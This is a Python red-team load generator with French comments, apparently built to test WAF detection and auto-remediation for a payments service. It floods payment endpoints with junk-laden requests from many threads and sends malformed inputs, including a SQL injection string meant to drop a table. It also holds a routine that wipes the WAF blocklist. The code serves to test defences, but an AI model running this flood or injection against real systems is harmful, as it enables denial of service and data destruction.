# pyright: reportMissingModuleSource=false
from __future__ import annotations

import argparse
import json
from pathlib import Path
import random
import string
import subprocess
import sys
import threading
import time
import uuid

# Détection de requests, sinon repli automatique sur urllib (standard library, sans venv)
try:
    import requests  # type: ignore[import-untyped,import-not-found]
    import urllib3  # type: ignore[import-untyped,import-not-found]

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    import ssl
    import urllib.error
    import urllib.request

    HAS_REQUESTS = False
    SSL_CTX = ssl._create_unverified_context()

# Statistiques d'attaque partagées
STATS = {
    "sent": 0,
    "ok_2xx": 0,
    "unauth_401": 0,
    "forbidden_403": 0,
    "client_4xx": 0,
    "server_5xx": 0,
    "errors": 0,
    "blocked_noticed": False,
    "already_blocked_at_start": False,
}
STATS_LOCK = threading.Lock()


def generate_heavy_data(size_kb=20):
    """Génère un bloc de texte volumineux pour consommer de la bande passante et des ressources."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))


def record_response(status_code: int | None):
    with STATS_LOCK:
        STATS["sent"] += 1
        if status_code is None:
            STATS["errors"] += 1
        elif 200 <= status_code < 300:
            STATS["ok_2xx"] += 1
        elif status_code == 401:
            STATS["unauth_401"] += 1
        elif status_code == 403:
            STATS["forbidden_403"] += 1
            if not STATS["blocked_noticed"] and not STATS["already_blocked_at_start"]:
                STATS["blocked_noticed"] = True
                print("\n" + "=" * 65)
                print("🚨 [REMEDIATION DETECTEE] Code HTTP 403 reçu !")
                print("   Le système Orbe vous a détecté et le WAF a bloqué votre IP !")
                print("   L'auto-remédiation autonome a fonctionné avec succès.")
                print("=" * 65 + "\n")
        elif 400 <= status_code < 500:
            STATS["client_4xx"] += 1
        elif 500 <= status_code < 600:
            STATS["server_5xx"] += 1


# -------------------------------------------------------------------
# Scénario 1 : Épuisement CPU / Mémoire
# -------------------------------------------------------------------
def worker_cpu_memory(target_base_url: str, token: str | None = None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    endpoints = [f"{target_base_url}/pay", f"{target_base_url}/api/payments/pay"]

    while True:
        payload = {
            "recipient_id": str(uuid.uuid4()),
            "amount": random.randint(10, 5000),
            "currency": "EUR",
            "metadata": {
                "junk_data": generate_heavy_data(size_kb=20),
                "timestamp": time.time(),
                "nested": [{"a": "x" * 200} for _ in range(25)],
            },
        }

        url = random.choice(endpoints)
        if HAS_REQUESTS:
            try:
                resp = requests.post(url, json=payload, headers=headers, timeout=5, verify=False)
                record_response(resp.status_code)
            except Exception:
                record_response(None)
        else:
            try:
                data = json.dumps(payload).encode("utf-8")
                req = urllib.request.Request(url, data=data, headers=headers, method="POST")
                with urllib.request.urlopen(req, timeout=5, context=SSL_CTX) as response:
                    record_response(response.status)
            except urllib.error.HTTPError as e:
                record_response(e.code)
            except Exception:
                record_response(None)


# -------------------------------------------------------------------
# Scénario 2 : Inondation de trafic & Erreurs de validation
# -------------------------------------------------------------------
def worker_traffic_errors(target_base_url: str, token: str | None = None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    targets = [
        (f"{target_base_url}/pay", {"amount": -100, "recipient_id": "invalid"}),
        (f"{target_base_url}/pay", {"amount": "nan", "recipient_id": "'; DROP TABLE clients; --"}),
        (f"{target_base_url}/api/payments/invalid_route", {}),
        (f"{target_base_url}/api/payments/status/00000000-0000-0000-0000-000000000000", None),
    ]

    while True:
        url, body = random.choice(targets)
        method = "POST" if body is not None else "GET"

        if HAS_REQUESTS:
            try:
                if method == "POST":
                    resp = requests.post(url, json=body, headers=headers, timeout=4, verify=False)
                else:
                    resp = requests.get(url, headers=headers, timeout=4, verify=False)
                record_response(resp.status_code)
            except Exception:
                record_response(None)
        else:
            try:
                data = json.dumps(body).encode("utf-8") if body is not None else None
                req = urllib.request.Request(url, data=data, headers=headers, method=method)
                with urllib.request.urlopen(req, timeout=4, context=SSL_CTX) as response:
                    record_response(response.status)
            except urllib.error.HTTPError as e:
                record_response(e.code)
            except Exception:
                record_response(None)


# -------------------------------------------------------------------
# Moniteur de statistiques en temps réel
# -------------------------------------------------------------------
def stats_monitor():
    start_time = time.time()
    warned_preblocked = False

    while True:
        time.sleep(1)
        with STATS_LOCK:
            sent = STATS["sent"]
            ok = STATS["ok_2xx"]
            c401 = STATS["unauth_401"]
            c403 = STATS["forbidden_403"]
            c4xx = STATS["client_4xx"]
            c5xx = STATS["server_5xx"]
            err = STATS["errors"]

        # Si dès les 2 premières secondes 100% des requêtes sont en 403, c'est que l'IP était déjà bloquée
        if not warned_preblocked and (time.time() - start_time >= 1.5) and c403 > 0 and (c403 == sent):
            warned_preblocked = True
            with STATS_LOCK:
                STATS["already_blocked_at_start"] = True
            print("\n" + "!" * 70)
            print("[!] INFORMATION : Votre IP est ACTUELLEMENT BLOQUEE dans le WAF !")
            print("    (Elle est restée dans la blocklist suite au test de remédiation précédent)")
            print("    Toutes vos requêtes sont rejetées d'office en HTTP 403.")
            print("")
            print("    👉 Pour réinitialiser le WAF et relancer une vraie attaque :")
            print("       python3 redteam/attack.py --reset")
            print("!" * 70 + "\n")

        status_line = f"[+] Requêtes: {sent} | 2xx: {ok} | 401: {c401} | 403 (Bloqué): {c403} | 4xx: {c4xx} | 5xx: {c5xx} | Erreurs réseau: {err}"
        print(status_line)


# -------------------------------------------------------------------
# Réinitialisation du WAF (Déblocage IP)
# -------------------------------------------------------------------
def reset_environment(target_url: str | None = None):
    """Débloque le WAF et réinitialise la blocklist (localement ou à distance)."""
    print("[*] Réinitialisation de la blocklist du WAF...")
    reset_ok = False
    success_msg = ""

    candidate_endpoints = []
    if target_url:
        cleaned_url = target_url.rstrip("/")
        dash_url = cleaned_url.replace("payments.", "dashboard.").replace("payment.", "dashboard.")
        candidate_endpoints.append(f"{dash_url}/api/reset")
        candidate_endpoints.append(f"{cleaned_url}/api/reset")
    candidate_endpoints.append("http://localhost:8003/reset")

    for ep in candidate_endpoints:
        try:
            if HAS_REQUESTS:
                r = requests.post(ep, timeout=4, verify=False)
                if r.status_code == 200:
                    reset_ok = True
                    success_msg = f"via l'API ({ep})"
                    break
            else:
                req = urllib.request.Request(ep, data=b"{}", headers={"Content-Type": "application/json"}, method="POST")
                with urllib.request.urlopen(req, timeout=4, context=SSL_CTX) as resp:
                    if resp.status == 200:
                        reset_ok = True
                        success_msg = f"via l'API ({ep})"
                        break
        except Exception:
            continue

    if not reset_ok:
        try:
            p = Path(__file__).resolve().parent.parent / "infra" / "waf" / "blocklist" / "blocklist.conf"
            if p.exists():
                p.write_text("# Dynamic blocklist\n", encoding="utf-8")
                res = subprocess.run(["docker", "kill", "--signal=HUP", "waf"], capture_output=True, check=False)
                if res.returncode == 0:
                    reset_ok = True
                    success_msg = "via le conteneur WAF local"
        except Exception:
            pass

    if reset_ok:
        print(f"[+] WAF réinitialisé avec succès ({success_msg}) : toutes les IP ont été débloquées !")
        print("[+] Vous pouvez relancer l'attaque pour observer la détection et l'auto-remédiation en direct :")
        url_hint = target_url or "https://payments.oorbe.fr"
        print(f"    python3 redteam/attack.py --url {url_hint} --threads 20 --mode resource")
    else:
        print("[-] Impossible de réinitialiser le WAF automatiquement à distance.")
        print("    👉 Pour réinitialiser manuellement sur le serveur (via SSH / terminal du serveur) :")
        print("       curl -X POST http://localhost:8003/reset")
        print("       (ou : echo '# Dynamic blocklist' > infra/waf/blocklist/blocklist.conf && docker kill --signal=HUP waf)")


# -------------------------------------------------------------------
# Lancement de l'attaque
# -------------------------------------------------------------------
def start_attack(target_base_url: str, mode: str, num_threads: int, token: str | None = None):
    backend_lib = "requests" if HAS_REQUESTS else "urllib (Python standard, sans venv)"
    print(f"[+] Cible : {target_base_url}")
    print(f"[+] Moteur HTTP : {backend_lib}")
    print(f"[+] Lancement de l'attaque en mode '{mode}' avec {num_threads} threads...")

    t_mon = threading.Thread(target=stats_monitor, daemon=True)
    t_mon.start()

    for i in range(num_threads):
        if mode == "resource":
            t = threading.Thread(target=worker_cpu_memory, args=(target_base_url, token), daemon=True)
        elif mode == "traffic":
            t = threading.Thread(target=worker_traffic_errors, args=(target_base_url, token), daemon=True)
        elif mode == "both":
            target_func = worker_cpu_memory if i % 2 == 0 else worker_traffic_errors
            t = threading.Thread(target=target_func, args=(target_base_url, token), daemon=True)
        else:
            print("[-] Mode invalide.")
            return

        t.start()

    print("[+] Attaque en cours. Observez l'apparition des 403 lorsque l'auto-remédiation se déclenchera.")
    print("[+] Appuyez sur Ctrl+C pour arrêter.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque par l'utilisateur.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Générateur de charge redteam pour tester la détection et l'auto-remédiation d'Orbe"
    )
    parser.add_argument(
        "--reset",
        action="store_true",
        help="Débloque toutes les adresses IP du WAF pour réinitialiser un test",
    )
    parser.add_argument(
        "--url",
        default="https://payments.oorbe.fr",
        help="URL de base cible (default: https://payments.oorbe.fr)",
    )
    parser.add_argument(
        "--mode",
        choices=["resource", "traffic", "both"],
        default="both",
        help="resource: Saturation CPU/Payload | traffic: Inondation req/err | both: Les deux",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=40,
        help="Nombre de requêtes parallèles à lancer (default: 40)",
    )
    parser.add_argument(
        "--token",
        default=None,
        help="Jeton JWT optionnel pour effectuer des requêtes authentifiées",
    )

    args = parser.parse_args()

    if args.reset:
        reset_environment(args.url)
        sys.exit(0)

    url = args.url.rstrip("/")
    start_attack(url, args.mode, args.threads, args.token)
